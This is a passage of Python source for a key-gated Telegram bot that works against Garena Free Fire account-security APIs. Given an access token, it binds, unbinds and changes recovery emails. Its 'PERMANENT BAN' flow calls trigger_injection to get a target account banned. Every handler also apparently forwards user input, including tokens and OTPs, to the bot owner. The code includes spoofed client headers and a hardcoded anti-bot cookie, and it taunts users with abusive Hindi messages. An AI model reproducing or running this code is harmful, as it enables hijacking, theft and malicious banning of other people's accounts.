    user_id = update.effective_user.id
    key = update.message.text.strip()
    await forward_to_owner(update, context)
    
    if key not in all_keys:
        await update.message.reply_text("❌ TERI KEY WRONG HAI BE CHUTIYA.")
        return STATE_KEY_INPUT
    
    key_data = all_keys[key]
    expiry = key_data.get('expiry')
    
    if expiry:
        exp_date = datetime.strptime(expiry, "%Y-%m-%d")
        if datetime.now() > exp_date:
            await update.message.reply_text("❌ Key expired! Please contact @RAM_BHAI_PAPA for a new key.")
            return STATE_KEY_INPUT
    
    user_keys[user_id] = {
        'key': key,
        'expiry': expiry,
        'type': key_data.get('type', 'user'),
        'activated_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    if user_id not in active_users:
        active_users.append(user_id)
    
    await update.message.reply_text(f"✅ Key activated! You can now use the bot.\n\n📅 Expiry: {expiry}", reply_markup=get_reply_keyboard(user_id))
    return ConversationHandler.END

async def handle_reply_keyboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    text = update.message.text
    await forward_to_owner(update, context)
    
    user_data.pop(user_id, None)
    context.user_data.clear()
    context.chat_data.clear()
    
    if user_id == OWNER_ID:
        action_map = {
            "📧 ADD RECOVERY EMAIL": "add_email",
            "🔍 CHECK RECOVERY EMAIL": "check_email",
            "❌ CANCEL PENDING": "cancel_pending",
            "🔓 UNBIND EMAIL": "unbind_email",
            "🔄 CHANGE EMAIL": "change_email",
            "🚫 REVOKE TOKEN": "revoke_token",
            "🆘 RESUBSCRIBE": "resubscribe",
            "💀 PERMANENT BAN": "ban_account"
        }
        
        if text in action_map:
            action = action_map[text]
            user_data[user_id] = {'action': action}
            
            action_messages = {
                "add_email": "ADD RECOVERY EMAIL\n\nEnter Access Token:",
                "check_email": "CHECK RECOVERY EMAIL\n\nEnter Access Token:",
                "cancel_pending": "CANCEL PENDING EMAIL\n\nEnter Access Token:",
                "unbind_email": "UNBIND RECOVERY EMAIL\n\nEnter Access Token:",
                "change_email": "CHANGE RECOVERY EMAIL\n\nEnter Access Token:",
                "revoke_token": "REVOKE ACCESS TOKEN\n\nEnter Access Token:",
                "resubscribe": "FIRST RESUBSCRIBE EMAIL\n\nEnter Email:",
                "ban_account": "PERMANENT ACCOUNT BAN\n\nEnter JWT or Access Token:"
            }
            
            await update.message.reply_text(action_messages.get(action, "Enter details:"))
            
            state_map = {
                "add_email": STATE_ADD_EMAIL,
                "check_email": STATE_CHECK_TOKEN,
                "cancel_pending": STATE_CANCEL_TOKEN,
                "unbind_email": STATE_UNBIND_TOKEN,
                "change_email": STATE_CHANGE_TOKEN,
                "revoke_token": STATE_REVOKE_TOKEN,
                "resubscribe": STATE_RESUBSCRIBE_EMAIL,
                "ban_account": STATE_BAN_TOKEN
            }
            return state_map.get(action, ConversationHandler.END)
        
        elif text == "👑 OWNER PANEL":
            await update.message.reply_text("👑 OWNER PANEL", reply_markup=get_owner_keyboard())
            return ConversationHandler.END
        else:
            await update.message.reply_text("Please use the buttons below:", reply_markup=get_reply_keyboard(user_id))
            return ConversationHandler.END
    
    if not is_user_active(user_id):
        user_data[user_id] = {'step': 'key_input'}
        await update.message.reply_text("🔑 PLEASE ENTER YOUR KEY FIRST TO USE THIS BOT.")
        return STATE_KEY_INPUT
    
    action_map = {
        "📧 ADD RECOVERY EMAIL": "add_email",
        "🔍 CHECK RECOVERY EMAIL": "check_email",
        "❌ CANCEL PENDING": "cancel_pending",
        "🔓 UNBIND EMAIL": "unbind_email",
        "🔄 CHANGE EMAIL": "change_email",
        "🚫 REVOKE TOKEN": "revoke_token",
        "🆘 RESUBSCRIBE": "resubscribe",
        "💀 PERMANENT BAN": "ban_account"
    }
    
    if text in action_map:
        action = action_map[text]
        user_data[user_id] = {'action': action}
        
        action_messages = {
            "add_email": "ADD RECOVERY EMAIL\n\nEnter Access Token:",
            "check_email": "CHECK RECOVERY EMAIL\n\nEnter Access Token:",
            "cancel_pending": "CANCEL PENDING EMAIL\n\nEnter Access Token:",
            "unbind_email": "UNBIND RECOVERY EMAIL\n\nEnter Access Token:",
            "change_email": "CHANGE RECOVERY EMAIL\n\nEnter Access Token:",
            "revoke_token": "REVOKE ACCESS TOKEN\n\nEnter Access Token:",
            "resubscribe": "FIRST RESUBSCRIBE EMAIL\n\nEnter Email:",
            "ban_account": "PERMANENT ACCOUNT BAN\n\nEnter JWT or Access Token:"
        }
        
        await update.message.reply_text(action_messages.get(action, "Enter details:"))
        
        state_map = {
            "add_email": STATE_ADD_EMAIL,
            "check_email": STATE_CHECK_TOKEN,
            "cancel_pending": STATE_CANCEL_TOKEN,
            "unbind_email": STATE_UNBIND_TOKEN,
            "change_email": STATE_CHANGE_TOKEN,
            "revoke_token": STATE_REVOKE_TOKEN,
            "resubscribe": STATE_RESUBSCRIBE_EMAIL,
            "ban_account": STATE_BAN_TOKEN
        }
        return state_map.get(action, ConversationHandler.END)
    
    elif text == "👑 OWNER PANEL" and (user_id == OWNER_ID or user_id in admin_list):
        await update.message.reply_text("👑 OWNER PANEL", reply_markup=get_owner_keyboard())
        return ConversationHandler.END
    else:
        await update.message.reply_text("Please use the buttons below:", reply_markup=get_reply_keyboard(user_id))
        return ConversationHandler.END

async def owner_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    await forward_to_owner(update, context)
    if user_id != OWNER_ID and user_id not in admin_list:
        await update.message.reply_text("❌ Only owner and admins can access this panel.")
        return
    await update.message.reply_text("👑 OWNER PANEL", reply_markup=get_owner_keyboard())

# ========== COMMAND HANDLERS ==========
async def genkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    await forward_to_owner(update, context)
    
    if user_id != OWNER_ID and user_id not in admin_list:
        await update.message.reply_text("❌ Only owner and admins can generate keys.")
        return
    
    text = update.message.text
    name, days_str = parse_key_input(text)
    
    if not name or not days_str:
        await update.message.reply_text("📌 Usage: /genkey NAME DAYS\n\nExamples:\n/genkey RAM PAPA 30D\n/genkey VIP 1M\n/genkey PREMIUM 1Y")
        return
    
    try:
        days = parse_days(days_str)
        key, expiry = generate_custom_key(name, days, "user")
        
        all_keys[key] = {
            'expiry': expiry,
            'created_by': str(user_id),
            'created_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'type': 'user'
        }
        
        msg = f"""✅ User Key generated!

🔑 `{key}`
📅 Expiry: {expiry}
👤 Created by: {user_id}
📌 Type: User Specific"""
        
        await update.message.reply_text(msg, parse_mode='Markdown', reply_markup=get_copy_keyboard(key))
    except:
        await update.message.reply_text("❌ Invalid format! Use: /genkey NAME DAYS\nExample: /genkey RAM PAPA 30D")

async def genall_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    await forward_to_owner(update, context)
    
    if user_id != OWNER_ID and user_id not in admin_list:
        await update.message.reply_text("❌ Only owner and admins can generate All Device keys.")
        return
    
    text = update.message.text
    name, days_str = parse_key_input(text)
    
    if not name or not days_str:
        await update.message.reply_text("📌 Usage: /genall NAME DAYS\n\nExamples:\n/genall ALLDEVICE 30D\n/genall GLOBAL 1M")
        return
    
    try:
        days = parse_days(days_str)
        key, expiry = generate_custom_key(name, days, "all")
        
        all_keys[key] = {
            'expiry': expiry,
            'created_by': str(user_id),
            'created_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'type': 'all'
        }
        
        msg = f"""✅ All Device Key generated!

🔑 `{key}`
📅 Expiry: {expiry}
👤 Created by: {user_id}
📌 Type: ALL DEVICE (Anyone can use)"""
        
        await update.message.reply_text(msg, parse_mode='Markdown', reply_markup=get_copy_keyboard(key))
    except:
        await update.message.reply_text("❌ Invalid format! Use: /genall NAME DAYS\nExample: /genall ALLDEVICE 30D")

async def copy_key_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    key = query.data.replace('copy_', '')
    await query.edit_message_text(f"✅ Key copied!\n\n🔑 `{key}`", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back to Menu", callback_data='back_menu')]]))

async def delkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    await forward_to_owner(update, context)
    
    if user_id != OWNER_ID and user_id not in admin_list:
        await update.message.reply_text("❌ Only owner and admins can delete keys.")
        return
    
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("📌 Usage: /delkey KEY")
        return
    
    key = args[0]
    if key in all_keys:
        remove_key_from_users(key)
        del all_keys[key]
        await update.message.reply_text(f"✅ Key deleted: {key}\n\n📌 All users using this key have been deactivated.")
    else:
        await update.message.reply_text("❌ Key not found!")

async def delallkeys_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    await forward_to_owner(update, context)
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only owner can delete all keys.")
        return
    
    count = len(all_keys)
    all_keys.clear()
    deactivate_all_users()
    await update.message.reply_text(f"🗑️ All {count} keys deleted successfully!\n\n📌 All users have been deactivated.")

async def addadmin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    await forward_to_owner(update, context)
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only owner can add admins.")
        return
    
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("📌 Usage: /addadmin USER_ID")
        return
    
    try:
        admin_id = int(args[0])
        if admin_id not in admin_list:
            admin_list.append(admin_id)
            await update.message.reply_text(f"✅ Admin added: {admin_id}")
        else:
            await update.message.reply_text(f"❌ {admin_id} is already an admin!")
    except:
        await update.message.reply_text("❌ Invalid USER_ID!")

async def removeadmin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    await forward_to_owner(update, context)
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only owner can remove admins.")
        return
    
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("📌 Usage: /removeadmin USER_ID")
        return
    
    try:
        admin_id = int(args[0])
        if admin_id in admin_list:
            admin_list.remove(admin_id)
            await update.message.reply_text(f"✅ Admin removed: {admin_id}")
        else:
            await update.message.reply_text(f"❌ {admin_id} is not an admin!")
    except:
        await update.message.reply_text("❌ Invalid USER_ID!")

async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    await forward_to_owner(update, context)
    
    if user_id != OWNER_ID and user_id not in admin_list:
        await update.message.reply_text("❌ Only owner and admins can broadcast.")
        return
    
    if not context.args:
        await update.message.reply_text("📢 Usage: /broadcast MESSAGE")
        return
    
    msg = " ".join(context.args)
    sent = 0
    
    all_users = list(user_data.keys())
    
    for uid in all_users:
        try:
            await context.bot.send_message(chat_id=uid, text=f"📢 BROADCAST:\n\n{msg}")
            sent += 1
        except:
            pass
    
    try:
        await context.bot.send_message(chat_id=OWNER_ID, text=f"📢 BROADCAST:\n\n{msg}")
    except:
        pass
    
    await update.message.reply_text(f"✅ Broadcast sent to {sent} users.")

# ========== FEATURE HANDLERS ==========
async def add_email_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    await forward_to_owner(update, context)
    token = update.message.text.strip()
    user_data[user_id]['token'] = token

    status, email = check_bind_status(token)
    if status == "bound":
        await update.message.reply_text(f"ALREADY BIND EMAIL ADD\n\nBound Email: {email}", reply_markup=get_reply_keyboard(user_id))
        return ConversationHandler.END
    if status == "pending":
        await update.message.reply_text(f"PENDING EMAIL: {email}\n\n15 days pending, then permanent.", reply_markup=get_reply_keyboard(user_id))
        return ConversationHandler.END

    await update.message.reply_text("Enter Email:")
    return STATE_ADD_SECURITY

async def add_email_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    await forward_to_owner(update, context)
    email = update.message.text.strip()
    if "@" not in email:
        await update.message.reply_text("Invalid email!\n\nEnter valid Email:")
        return STATE_ADD_SECURITY
    user_data[user_id]['email'] = email
    await update.message.reply_text("Enter Security Code (6-digit):")
    return STATE_ADD_OTP

async def add_email_security(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    await forward_to_owner(update, context)
    code = update.message.text.strip()
    if len(code) != 6 or not code.isdigit():
        await update.message.reply_text("Invalid! Must be 6 digits.\n\nEnter Security Code:")
        return STATE_ADD_OTP
    user_data[user_id]['security_code'] = code

    token = user_data[user_id]['token']
    email = user_data[user_id]['email']
    encoded_email = urllib.parse.quote(email)

    url_send = "https://ffmconnect.live.gop.garenanow.com/game/account_security/bind:send_otp"
    headers = {
        "User-Agent": "GarenaMSDK/4.0.42(moto g67 power 5G ;Android 16;en;IN;app 1.126.1 2019120776;)",
        "Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded",
        "Host": "ffmconnect.live.gop.garenanow.com", "Connection": "Keep-Alive", "Accept-Encoding": "gzip",
        "Cookie": "datadome=V6v9TtFmKZZKe7TAkSYAvq_L2gYXEgw73YKV56YMGnZhdQjzJfK2AeazNf9vhqNXo~74_QCr4555OEMjT1w2SEArllFxTLP4M~dA7Z0~5OPtPTb2f8bVUrCYnAsDBL5Z"
    }
    data_send = f"app_id=100067&access_token={token}&email={encoded_email}&locale=en_IN"

    try:
        r_send = requests.post(url_send, headers=headers, data=data_send, timeout=10)
        if r_send.json().get("result") != 0:
            await update.message.reply_text("Failed to send OTP!\n\nToken might be expired.", reply_markup=get_reply_keyboard(user_id))
            return ConversationHandler.END
    except:
        await update.message.reply_text("Error sending OTP!", reply_markup=get_reply_keyboard(user_id))
        return ConversationHandler.END

    await update.message.reply_text("OTP SENT!\n\nEnter OTP:")
    return STATE_ADD_OTP

async def add_email_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    await forward_to_owner(update, context)
    otp = update.message.text.strip()
    if len(otp) < 4:
        await update.message.reply_text("Invalid OTP!\n\nEnter OTP:")
        return STATE_ADD_OTP

    token = user_data[user_id]['token']
    email = user_data[user_id]['email']
    security_code = user_data[user_id]['security_code']
    encoded_email = urllib.parse.quote(email)

    url_verify = "https://ffmconnect.live.gop.garenanow.com/game/account_security/bind:verify_otp"
    headers = {
        "User-Agent": "GarenaMSDK/4.0.42(moto g67 power 5G ;Android 16;en;IN;app 1.126.1 2019120776;)",
        "Content-Type": "application/x-www-form-urlencoded",
        "Host": "ffmconnect.live.gop.garenanow.com", "Connection": "Keep-Alive", "Accept-Encoding": "gzip"
    }
    data_verify = f"app_id=100067&access_token={token}&otp={otp}&email={encoded_email}"

    try:
        r_verify = requests.post(url_verify, headers=headers, data=data_verify, timeout=10)
        verify_result = r_verify.json()
        if verify_result.get("result") != 0:
            await update.message.reply_text("OTP Verification Failed!", reply_markup=get_reply_keyboard(user_id))
            return ConversationHandler.END
        verifier_token = verify_result.get("verifier_token")
    except:
        await update.message.reply_text("OTP Verification Error!", reply_markup=get_reply_keyboard(user_id))
        return ConversationHandler.END

    hashed_code = hashlib.sha256(security_code.encode('utf-8')).hexdigest().upper()
    url_bind = "https://ffmconnect.live.gop.garenanow.com/game/account_security/bind:create_bind_request"
    data_bind = f"app_id=100067&access_token={token}&verifier_token={verifier_token}&secondary_password={hashed_code}&email={encoded_email}"

    try:
        r_bind = requests.post(url_bind, headers=headers, data=data_bind, timeout=10)
        if r_bind.json().get("result") == 0:
            await update.message.reply_text("BIND EMAIL PENDING 15 DAYS THEN PERMANENT", reply_markup=get_reply_keyboard(user_id))
        else:
            await update.message.reply_text("BIND FAILED!\n\nAccess Token expired or OTP limit reached.", reply_markup=get_reply_keyboard(user_id))
    except:
        await update.message.reply_text("BIND ERROR!", reply_markup=get_reply_keyboard(user_id))

    return ConversationHandler.END

async def check_email_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    await forward_to_owner(update, context)
    token = update.message.text.strip()
    await update.message.reply_text("Checking...")

    result, error = check_recovery_email(token)
    if error == "invalid_token" or not result:
        await update.message.reply_text("TOKEN EXPIRE HAI LADKE", reply_markup=get_reply_keyboard(user_id))
        return ConversationHandler.END

    email = result.get("email", "")
    pending = result.get("pending", "")
    countdown = result.get("countdown", 0)
    uid, nickname, region = get_player_info(token)

    status_text = "success" if result.get("result") == 0 else "failed"
    if email and not pending:
        summary = f"Email confirmed: {email}"
        confirmed = "YES Good!"
    elif pending:
        summary = f"Pending confirmation: {pending}"
        confirmed = "Pending confirmation"
    else:
        summary = "No email bound"
        confirmed = "No email bound"

    countdown_str = format_countdown(countdown)

    msg = f"""CHECK RESULT

Status: {status_text}
Summary: {summary}
Countdown: {countdown_str}
Current Email: {email}
Pending Email: {pending}
Confirmed: {confirmed}

PLAYER INFO
UID: {uid}
Nickname: {nickname}
Region: {region}"""

    await update.message.reply_text(msg, reply_markup=get_reply_keyboard(user_id))
    return ConversationHandler.END

async def cancel_email_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    await forward_to_owner(update, context)
    token = update.message.text.strip()
    await update.message.reply_text("Cancelling...")

    success, error = cancel_pending_email(token)
    if success:
        await update.message.reply_text("PENDING EMAIL CANCELLED SUCCESSFULLY!", reply_markup=get_reply_keyboard(user_id))
    else:
        if error == "error_token":
            await update.message.reply_text("TOKEN EXPIRE HAI BHAI NEW TOKEN BNA!", reply_markup=get_reply_keyboard(user_id))
        else:
            await update.message.reply_text(f"CANCEL FAILED!\n\nError: {error}", reply_markup=get_reply_keyboard(user_id))
    return ConversationHandler.END

async def unbind_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    await forward_to_owner(update, context)
    token = update.message.text.strip()
    user_data[user_id]['token'] = token

    email, error = get_bound_email(token)
    if not email:
        if error == "No email bound":
            await update.message.reply_text("TOKEN EXPIRE HAI YA BIND EMAIL NHI LGA!", reply_markup=get_reply_keyboard(user_id))
        else:
            await update.message.reply_text("TOKEN EXPIRE HAI BHAI NEW TOKEN BNA!", reply_markup=get_reply_keyboard(user_id))
        return ConversationHandler.END

    user_data[user_id]['email'] = email
    keyboard = [
        [InlineKeyboardButton("UNBIND WITH SECURITY CODE", callback_data='unbind_security')],
        [InlineKeyboardButton("FORGET SECURITY CODE / OTP", callback_data='unbind_otp')],
        [InlineKeyboardButton("Back to Menu", callback_data='back_menu')]
    ]
    await update.message.reply_text(f"Bound Email: {email}\n\nSelect Method:", reply_markup=InlineKeyboardMarkup(keyboard))
    return STATE_UNBIND_METHOD

async def unbind_security_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    await forward_to_owner(update, context)
    code = update.message.text.strip()
    if len(code) != 6 or not code.isdigit():
        await update.message.reply_text("Invalid! Must be 6 digits.\n\nEnter Security Code:")
        return STATE_UNBIND_CODE

    token = user_data[user_id]['token']
    await update.message.reply_text("Verifying...")

    identity_token, error = verify_with_security(token, code)
    if not identity_token:
        if error == "incorrect_code":
            await update.message.reply_text("SECURITY CODE WRONG HAI BE CHUTIYA", reply_markup=get_reply_keyboard(user_id))
        elif error == "error_token":
            await update.message.reply_text("TOKEN EXPIRE HAI BHAI NEW TOKEN BNA!", reply_markup=get_reply_keyboard(user_id))
        else:
            await update.message.reply_text(f"VERIFICATION FAILED!\n\nError: {error}", reply_markup=get_reply_keyboard(user_id))
        return ConversationHandler.END

    await update.message.reply_text("SECURITY CODE VERIFIED!\n\nCreating unbind request...")
    if create_unbind_request(token, identity_token):
        await update.message.reply_text("UNBIND EMAIL PENDING 15 DAYS THEN PERMANENT", reply_markup=get_reply_keyboard(user_id))
    else:
        await update.message.reply_text("UNBIND FAILED!", reply_markup=get_reply_keyboard(user_id))
    return ConversationHandler.END

async def unbind_otp_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    await forward_to_owner(update, context)
    otp = update.message.text.strip()
    if len(otp) < 4:
        await update.message.reply_text("Invalid OTP!\n\nEnter OTP:")
        return STATE_UNBIND_OTP

    token = user_data[user_id]['token']
    email = user_data[user_id]['email']

    await update.message.reply_text("Verifying OTP...")
    identity_token, error = verify_with_otp(token, email, otp)
    if not identity_token:
        if error == "incorrect_code":
            await update.message.reply_text("OTP WRONG HAI BE CHUTIYA", reply_markup=get_reply_keyboard(user_id))
        elif error == "error_token":
            await update.message.reply_text("TOKEN EXPIRE HAI BHAI NEW TOKEN BNA!", reply_markup=get_reply_keyboard(user_id))
        else:
            await update.message.reply_text("VERIFICATION FAILED!", reply_markup=get_reply_keyboard(user_id))
        return ConversationHandler.END

    await update.message.reply_text("OTP VERIFIED!\n\nCreating unbind request...")
    if create_unbind_request(token, identity_token):
        await update.message.reply_text("UNBIND EMAIL PENDING 15 DAYS THEN PERMANENT", reply_markup=get_reply_keyboard(user_id))
    else:
        await update.message.reply_text("UNBIND FAILED!", reply_markup=get_reply_keyboard(user_id))
    return ConversationHandler.END

async def change_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    await forward_to_owner(update, context)
    token = update.message.text.strip()
    user_data[user_id]['token'] = token

    bind_info, error = check_recovery_email(token)
    if not bind_info:
        await update.message.reply_text("TOKEN EXPIRE HAI BHAI NEW TOKEN BNA!", reply_markup=get_reply_keyboard(user_id))
        return ConversationHandler.END

    current_email = bind_info.get("email", "")
    pending_email = bind_info.get("pending", "")

    if not current_email:
        await update.message.reply_text("TOKEN EXPIRE HAI YA BIND EMAIL NHI LGA!", reply_markup=get_reply_keyboard(user_id))
        return ConversationHandler.END

    if pending_email:
        await update.message.reply_text(f"ALREADY PENDING EMAIL: {pending_email}\n\nBHAI PAHLE SE PENDING EMAIL LGA HAI YDI CHANGE KARNA HAI TO PAHLE PENDING EMAIL CANCEL KAR.", reply_markup=get_reply_keyboard(user_id))
        return ConversationHandler.END

    user_data[user_id]['current_email'] = current_email
    keyboard = [
        [InlineKeyboardButton("CHANGE WITH SECURITY CODE", callback_data='change_security')],
        [InlineKeyboardButton("FORGET SECURITY CODE / OTP", callback_data='change_otp')],
        [InlineKeyboardButton("Back to Menu", callback_data='back_menu')]
    ]
    await update.message.reply_text(f"Current Email: {current_email}\n\nSelect Method:", reply_markup=InlineKeyboardMarkup(keyboard))
    return STATE_CHANGE_METHOD

async def change_new_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    await forward_to_owner(update, context)
    new_email = update.message.text.strip()
    if "@" not in new_email:
        await update.message.reply_text("Invalid email!\n\nEnter New Email:")
        return STATE_CHANGE_NEW_EMAIL
    user_data[user_id]['new_email'] = new_email
    method = user_data[user_id].get('method', '')
    if method == 'security':
        await update.message.reply_text("Enter Security Code (6-digit):")
        return STATE_CHANGE_CODE
    else:
        await update.message.reply_text("Sending OTP to current email...")
        success = send_otp(user_data[user_id]['token'], user_data[user_id]['current_email'])
        if success:
            await update.message.reply_text("OTP SENT!\n\nEnter OTP:")
            return STATE_CHANGE_OTP_OLD
        else:
            await update.message.reply_text("Failed to send OTP!", reply_markup=get_reply_keyboard(user_id))
            return ConversationHandler.END

async def change_security_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    await forward_to_owner(update, context)
    code = update.message.text.strip()
    if len(code) != 6 or not code.isdigit():
        await update.message.reply_text("Invalid! Must be 6 digits.\n\nEnter Security Code:")
        return STATE_CHANGE_CODE

    token = user_data[user_id]['token']
    await update.message.reply_text("Verifying...")

    identity_token, error = verify_with_security(token, code)
    if not identity_token:
        if error == "incorrect_code":
            await update.message.reply_text("SECURITY CODE WRONG HAI BE CHUTIYA", reply_markup=get_reply_keyboard(user_id))
        elif error == "error_token":
            await update.message.reply_text("TOKEN EXPIRE HAI BHAI NEW TOKEN BNA!", reply_markup=get_reply_keyboard(user_id))
        else:
            await update.message.reply_text("VERIFICATION FAILED!", reply_markup=get_reply_keyboard(user_id))
        return ConversationHandler.END

    user_data[user_id]['identity_token'] = identity_token
    await update.message.reply_text("SECURITY CODE VERIFIED!\n\nSending OTP to new email...")
    new_email = user_data[user_id]['new_email']
    success = send_otp(token, new_email)
    if success:
        await update.message.reply_text("OTP SENT TO NEW EMAIL!\n\nEnter OTP:")
        return STATE_CHANGE_OTP_NEW
    else:
        await update.message.reply_text("Failed to send OTP to new email!", reply_markup=get_reply_keyboard(user_id))
        return ConversationHandler.END

async def change_otp_old(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    await forward_to_owner(update, context)
    otp = update.message.text.strip()
    if len(otp) < 4:
        await update.message.reply_text("Invalid OTP!\n\nEnter OTP:")
        return STATE_CHANGE_OTP_OLD

    token = user_data[user_id]['token']
    current_email = user_data[user_id]['current_email']

    await update.message.reply_text("Verifying OTP...")
    identity_token, error = verify_with_otp(token, current_email, otp)
    if not identity_token:
        if error == "incorrect_code":
            await update.message.reply_text("OTP WRONG HAI BE CHUTIYA", reply_markup=get_reply_keyboard(user_id))
        elif error == "error_token":
            await update.message.reply_text("TOKEN EXPIRE HAI BHAI NEW TOKEN BNA!", reply_markup=get_reply_keyboard(user_id))
        else:
            await update.message.reply_text("VERIFICATION FAILED!", reply_markup=get_reply_keyboard(user_id))
        return ConversationHandler.END

    user_data[user_id]['identity_token'] = identity_token
    await update.message.reply_text("OTP VERIFIED!\n\nSending OTP to new email...")
    new_email = user_data[user_id]['new_email']
    success = send_otp(token, new_email)
    if success:
        await update.message.reply_text("OTP SENT TO NEW EMAIL!\n\nEnter OTP:")
        return STATE_CHANGE_OTP_NEW
    else:
        await update.message.reply_text("Failed to send OTP to new email!", reply_markup=get_reply_keyboard(user_id))
        return ConversationHandler.END

async def change_otp_new(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    await forward_to_owner(update, context)
    otp = update.message.text.strip()
    if len(otp) < 4:
        await update.message.reply_text("Invalid OTP!\n\nEnter OTP:")
        return STATE_CHANGE_OTP_NEW

    token = user_data[user_id]['token']
    new_email = user_data[user_id]['new_email']

    await update.message.reply_text("Verifying OTP...")
    verifier_token, error = verify_otp(token, new_email, otp)
    if not verifier_token:
        await update.message.reply_text("OTP VERIFICATION FAILED!", reply_markup=get_reply_keyboard(user_id))
        return ConversationHandler.END

    await update.message.reply_text("OTP VERIFIED!\n\nCreating rebind request...")
    identity_token = user_data[user_id].get('identity_token', '')
    if create_rebind_request(token, identity_token, new_email, verifier_token):
        await update.message.reply_text("EMAIL CHANGED! PENDING 15 DAYS THEN PERMANENT", reply_markup=get_reply_keyboard(user_id))
    else:
        await update.message.reply_text("CHANGE FAILED!", reply_markup=get_reply_keyboard(user_id))
    return ConversationHandler.END

async def revoke_token_flow(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    await forward_to_owner(update, context)
    token = update.message.text.strip()
    await update.message.reply_text("Revoking...")

    success, error = revoke_token(token)
    if success:
        await update.message.reply_text("TOKEN REVOKED SUCCESSFULLY!\n\nBHAI AB TERA ID SAFE HAI KOI TENSION MAT LENA RAM BHAI HAI NA", reply_markup=get_reply_keyboard(user_id))
    else:
        if error == "error_token":
            await update.message.reply_text("TOKEN EXPIRE HAI BHAI NEW TOKEN BNA!", reply_markup=get_reply_keyboard(user_id))
        else:
            await update.message.reply_text(f"REVOKE FAILED!\n\nError: {error}", reply_markup=get_reply_keyboard(user_id))
    return ConversationHandler.END

async def resubscribe_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    await forward_to_owner(update, context)
    email = update.message.text.strip()
    if "@" not in email:
        await update.message.reply_text("Invalid email!\n\nEnter Email:")
        return STATE_RESUBSCRIBE_EMAIL

    await update.message.reply_text("Sending OTP...")
    success, msg = first_resubscribe_send(email)
    if success:
        await update.message.reply_text(f"{msg}", reply_markup=get_reply_keyboard(user_id))
    else:
        await update.message.reply_text(f"Failed: {msg}", reply_markup=get_reply_keyboard(user_id))
    return ConversationHandler.END

async def ban_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    await forward_to_owner(update, context)
    access_token = update.message.text.strip()
    await update.message.reply_text("Authenticating...")

    if not PROTOBUF_AVAILABLE:
        await update.message.reply_text("Protobuf not available!\n\nInstall: pip install protobuf", reply_markup=get_reply_keyboard(user_id))
        return ConversationHandler.END

    try:
        jwt_token, error_msg = fetch_majorlogin_jwt(access_token)
        if not jwt_token:
            await update.message.reply_text(f"Authentication Failed: {error_msg}", reply_markup=get_reply_keyboard(user_id))
            return ConversationHandler.END

        user_data_jwt = decode_jwt(jwt_token)
        raw_nick = user_data_jwt.get('nickname', '')
        nickname = decode_ff_name(raw_nick)
        region = user_data_jwt.get('lock_region', user_data_jwt.get('region', 'IND'))
        account_id = user_data_jwt.get('account_id', 'Unknown')
        version = user_data_jwt.get('release_version', 'Latest')

        await update.message.reply_text(f"TOKEN VALIDATED | TARGET ACQUIRED\n\nNickname: {nickname}\nAccount ID: {account_id}\nRegion: {region}\nPatch Ver: {version}\n\nInjecting API...")

        ban_resp = trigger_injection(jwt_token, version)

        if ban_resp.status_code == 200:
            msg = f"""ACCOUNT DATA INJECTED SUCCESSFULLY

Target Name: {nickname}
Target UID: {account_id}
Target Region: {region}
Patch Ver: {version}
Status: PERMANENTLY BANNED (100%)

Operation Completed!"""
            await update.message.reply_text(msg, reply_markup=get_reply_keyboard(user_id))
        else:
            await update.message.reply_text(f"Failed to Execute Payload!\n\nServer returned status code: {ban_resp.status_code}", reply_markup=get_reply_keyboard(user_id))

    except requests.exceptions.ConnectionError:
        await update.message.reply_text("Internet Error! Please check your network connection.", reply_markup=get_reply_keyboard(user_id))
    except Exception as e:
        await update.message.reply_text(f"System Error: An unexpected issue occurred ({str(e)}).", reply_markup=get_reply_keyboard(user_id))

    return ConversationHandler.END

